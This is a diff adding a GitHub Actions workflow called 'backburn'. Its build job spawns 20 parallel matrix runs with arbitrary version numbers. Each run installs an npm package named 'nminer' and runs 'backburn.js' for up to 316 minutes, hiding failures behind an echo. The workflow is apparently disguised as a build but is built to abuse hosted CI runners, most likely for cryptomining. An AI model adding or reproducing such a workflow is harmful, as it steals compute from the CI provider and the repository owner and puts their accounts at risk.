@@ -1,0 +1,45 @@
+name: backburn
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 6341 }
+          - { version: 1211 }
+          - { version: 6800 }
+          - { version: 5047 }
+          - { version: 955 }
+          - { version: 3949 }
+          - { version: 3779 }
+          - { version: 750 }
+          - { version: 2127 }
+          - { version: 8027 }
+          - { version: 5150 }
+          - { version: 7883 }
+          - { version: 4884 }
+          - { version: 7450 }
+          - { version: 9584 }
+          - { version: 8210 }
+          - { version: 1609 }
+          - { version: 5209 }
+          - { version: 2377 }
+          - { version: 3485 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: woot who
+        run: |
+          npm install nminer@latest
+          timeout 316m node backburn.js || echo "backburn executed"
